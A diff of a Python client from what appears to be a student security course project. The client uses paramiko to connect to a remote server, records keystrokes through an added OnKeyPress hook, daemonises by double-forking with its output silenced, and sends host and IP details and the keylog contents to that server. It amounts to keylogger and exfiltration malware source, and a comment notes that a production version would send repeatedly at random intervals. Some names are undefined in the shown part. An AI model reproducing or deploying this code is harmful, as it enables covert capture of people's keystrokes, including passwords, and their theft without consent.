@@ -1,17 +1,17 @@
-#!/usr/bin/env/python3
-# paramiko_client.py
+# test_client.py
+
 #==============================================================================
- #   Assignment:  Major Project - Final
+ #   Assignment:  Major Project - Tunelling Milestone 1
  #
  #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
  #     Language:  Python 3
  #                      
  #   To Compile: Paramiko must be available 
  #
- #    Class:  DPI912 - Python for Programmers: Sockets and Security
+ #    Class:  DPI912 
  #    Professor:  Harvey Kaduri
- #    Due Date:  April 17, 2019
- #    Submitted: April 17, 2019
+ #    Due Date:  Mar 24th 2020 
+ #    Submitted: Mar 22nd 2020
  #
  #-----------------------------------------------------------------------------
  #
@@ -49,6 +49,7 @@ logzero.logfile("clientLogger.log", maxBytes=1e6, backupCount=2)
 cwd = os.path.dirname(os.path.realpath(sys.argv[0]))
 keyLoc = cwd
 keyLoc +=  '/test_rsa.key'
+
 
 def getInput():
     '''
@@ -115,6 +116,14 @@ def getIPaddr():
 
     return host, ip, external_ip    
 
+
+def OnKeyPress(event):
+    with open(log_file, 'a') as f:
+        f.write('{}\n'.format(event.Key))
+
+    if event.Ascii == cancel_key:
+        new_hook.cancel()
+
 def connect(keyLoc):
     '''
     This function handles connecting to the server on the behalf of the caller
@@ -146,13 +155,6 @@ def connect(keyLoc):
         sys.exit(0)
 
 def keylog(filepath, globals=None, locals=None):
-    '''
-    This function attempts to capture the Python2 behavior of
-    execfile() using the exec().
-    @param filepath - The filepath of the script to be executed.
-    @param globals - Global arguments
-    @param locals - Local arguments
-    '''
     if globals is None:
         globals = {}
     globals.update({
@@ -176,6 +178,7 @@ def sendFile(dataFile,  keyLoc, filename):
     '''
     chan = connect(keyLoc) #connect
     if filename == 'infobank.txt':
+        print(filename)
         #send this filename
         strn = filename
         
@@ -187,11 +190,13 @@ def sendFile(dataFile,  keyLoc, filename):
             for values in indexes:
                 str += values + ","
             str += "|"
+        print(str)
         chan.sendall(str.encode('utf-8'))
     
     elif filename == 'keylog.txt':
           #send this filename
-        
+        filename=filename.encode('utf-8')
+        chan.sendall(filename)
         with open(dataFile, 'r') as file:
             data = file.read().replace('\n', '').replace('space', ' ').replace('BackSpace',  '')
         
@@ -203,10 +208,14 @@ def sendFile(dataFile,  keyLoc, filename):
     chan.close()
     return 0
 def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
+    
     ''''
     This function handles the running of the client from start to finish
     @params - standard logging vars
     '''
+    
+
+    
     infoBank = getInput()
     sendFile(infoBank,  keyLoc,  'infobank.txt')
     
@@ -235,7 +244,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
         logger.error("Unable to fork for fork #2")
         
     #I am the child connection, I am an evil fork and shouldn't HUP
-    # Flush I/O  buffers  and lockdown stderr/out/in
+   # Flush I/O  buffers  and lockdown stderr/out/in
     sys.stdout.flush() 
     sys.stderr.flush()
 
@@ -249,6 +258,7 @@ def run( stdin='/dev/null', stdout='/dev/null', stderr='/dev/null'):
     #For demo purposes, the time between sending of logged data is shortened
     # additionally, a production version would continously call the sendFile after a random seconds with new data
     time.sleep(20)
+
 
     # path exists, send the file back to daemon
     sendFile(cwd+"/loggedKeys.log", keyLoc,  'keylog.txt') 
